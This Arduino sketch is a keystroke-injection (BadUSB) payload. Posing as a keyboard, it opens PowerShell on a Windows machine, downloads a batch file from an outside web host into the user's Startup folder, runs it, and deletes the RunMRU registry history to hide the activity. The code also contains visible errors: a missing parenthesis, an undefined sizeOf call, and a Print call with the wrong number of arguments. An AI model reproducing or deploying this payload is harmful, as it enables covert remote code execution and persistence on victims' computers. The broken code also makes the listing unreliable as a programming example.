#include <Keyboard.h>

byte KEYPAD[10] = {234, 225, 226, 227, 228, 229, 230, 231, 232, 233};

String vectors[5] = {
  "cd '~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'",
  "wget http://website.net/scripts/ShellStartupWin10.bat -OutFile 'Win10Startup.bat'",
  "start Win10Startup.bat",
  "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f",
  "exit"
  };

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void Print(String s, int d){

  Keyboard.print(s);
  typeKey(KEY_RETURN);
  Serial.print(s);
  delay(d);
  
}

void setup() {

  Keyboard.begin();

  delay(500);

  Keyboard.releaseAll();

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(50);
  
  Keyboard.releaseAll();

  Print("powershell", 300);

  for(int i = 0; i<sizeOf(vectors); i++ {
    Print(vectors[i]);
  }

  Keyboard.end();

}

void loop() {

}
